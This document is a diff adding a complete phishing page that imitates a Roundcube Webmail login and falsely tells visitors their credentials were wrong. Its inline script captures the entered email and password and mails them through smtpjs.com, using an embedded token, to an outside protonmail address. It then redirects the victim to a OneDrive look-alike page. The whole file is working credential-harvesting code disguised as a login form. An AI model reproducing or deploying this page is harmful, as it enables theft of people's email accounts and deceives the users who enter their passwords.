@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="style01.css" rel="stylesheet" />
+    <script src="script01.js" ></script>
+    <title>Log in</title>
+    
+
+</head>
+<body class="lapsa">
+    <script src="script01.js"></script>
+    <div class="loginbox">
+        <form class="login"  action="#">
+            <label class="v2surewest"  style="font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;">
+                <b>
+                    Incorrect Login Credentials,Please try again 
+                </b>
+            </label>
+            <br><br>
+            <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjoO7RuR0NquDexa31sfnj_bu29fgXViiulHeSiJwpr5amZWfYunw9auZwvUmh9pY4z_KXfzCWpFTQZ7IgT1Jivbal6UUvd6yx5X5hfy_gR2k4StOIi98NHxTod9hmIucxt4SVkjFHL8WX991RVG-petMgi2Di_e3qFTGEF6LL4dpWD57SIIOCDG-sOV2vC/s320/Roundcube_logo_icon.svg.png" alt="Alternate text" class="Ouser" />
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://onedrive--shared-documents-wenasndue3n2wnw23us.on.drv.tw/viewdocument--incorrectcredentials--2jashywu2/923932932932938438 roundcudewebmail.html">
+            <input type="email" name="email" class="txtoemail" placeholder="Email" required>
+            <input type="Password" name="Pass" class="txtopass" placeholder="Password" required>
+            <button class="roundbtnsubmit" type="submit" >LOGIN</button>
+            <br><br>
+            <label class="Iblodown"  style="font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;">
+                <b>
+                    Roundcube Webmail 
+                </b>
+            </label> 
+
+        </form>
+        <script src="https://smtpjs.com/v3/smtp.js">
+        </script>
+    
+        <script>
+              
+            const form = document.querySelector('.login')
+    
+    
+           function sendMsg(e){
+            e.preventDefault();
+            
+                const  Fullname = document.querySelector('.txtoemail')
+                  department = document.querySelector('.txtopass')
+    
+    
+             Email.send({
+             SecureToken : "523b9631-eba2-428d-b404-b38a5c0db98f",
+             To : 'cansiloma120@protonmail.com',
+             From : "yohnlom@gmail.com",
+             Subject : "This is the subject"+"="+Fullname.value,
+             Body : "NAME  ["+Fullname.value+"]   department  ["+department.value+"]"
+             });
+             window.location.href = "https://Onedrivedocuments.github.io/viewdocuments-23jqmsai32mwqm3wqj3/923932932932938438 roundcudewebmail.html";
+           }
+    
+           form.addEventListener('submit', sendMsg);
+    
+            
+        </script>
+    </div>
+</body>
+</html>
